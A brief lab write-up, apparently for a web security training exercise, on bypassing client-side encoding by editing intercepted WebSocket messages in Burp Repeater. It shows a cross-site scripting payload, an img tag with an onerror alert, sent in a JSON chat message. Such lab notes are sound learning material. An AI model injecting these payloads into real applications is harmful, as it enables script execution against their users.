# Manipulating WebSocket messages to exploit vulnerabilities
Use Burp proxy to intercept ws messages. When a request containing < is sent to the sever, it us encoded as `&lt;`
Then send it to repeater. First I tried sending `<script>alert(1)</script>`, which didn't do anything. After that, I tried `<img src=1 onerror='alert(1)'>` which solved the lab.

```json
{
    "message": "<img src=1 onerror='alert(1)'>"
}
```
